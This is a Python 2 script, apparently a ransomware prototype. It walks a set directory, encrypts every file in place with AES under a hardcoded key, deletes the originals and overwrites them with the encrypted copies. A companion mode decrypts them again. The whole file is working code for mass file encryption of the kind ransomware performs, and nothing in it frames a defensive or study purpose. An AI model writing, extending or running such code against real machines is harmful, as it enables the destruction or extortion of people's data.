import os, random, struct, sys
from Crypto.Cipher import AES

key = 'This is a key123'
startPath = 'C:\\Users\\t3d\\Desktop\\test'

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.crypt'
    iv = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))
    outfile.close()
    infile.close()
    try:
        os.remove(in_filename)
        os.rename(out_filename, in_filename)
    except WindowsError:
        print "marche passss"

def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)
        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(origsize)
    outfile.close()
    infile.close()
    try:
        os.remove(in_filename)
        os.rename(out_filename, in_filename)
    except WindowsError:
        print "marche passss"

def main():
    if sys.argv[1] == "crypt":
        for root, dirs, files in os.walk(startPath, topdown=False):
            for name in files:
                myFile = os.path.join(root, name)
                try:
                    encrypt_file(key, myFile)
                    print "Encrypting " + myFile
                except IOError:
                    print "Permission denied for " + myFile
    elif sys.argv[1] == "decrypt":
        for root, dirs, files in os.walk(startPath, topdown=False):
            for name in files:
                myFile = os.path.join(root, name)
                try:
                    decrypt_file(key, myFile)
                    print "Decrypting " + myFile
                except IOError:
                    print "Permission denied for " + myFile
    else:
        exit(0)

main()
